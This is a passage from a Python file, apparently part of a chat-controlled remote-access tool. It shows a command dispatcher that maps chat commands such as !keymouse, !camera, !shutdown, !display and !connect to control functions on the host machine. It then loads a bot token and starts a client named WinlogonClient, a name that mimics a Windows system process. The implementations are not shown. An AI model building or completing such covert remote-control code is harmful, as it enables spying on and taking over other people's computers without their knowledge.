        elif self.if_command(command, "!sound"):
            await Scripts.sound(message)

        elif self.if_command(command, "!connect"):
            await Scripts.connect(message)

        elif self.if_command(command, "!display"):
            await Scripts.display(message)

        elif self.if_command(command, "!keymouse"):
            await Scripts.key_mouse(message)

        elif self.if_command(command, "!shutdown"):
            await Scripts.shutdown(message)

        elif self.if_command(command, "!minimize"):
            await Scripts.minimize(message)

        elif self.if_command(command, "!demka"):
            await Scripts.demonstration(message)

        elif self.if_command(command, "!start"):
            await Scripts.start(message)

        elif self.if_command(command, "!camera"):
            try:
                await Scripts.camera()
            except BaseException:
                print("Ошибка")"""


with open(os.path.dirname(__file__) + "/resources/TOKEN") as f:
    for read in f:
        token = read

client = WinlogonClient()
client.run(token)
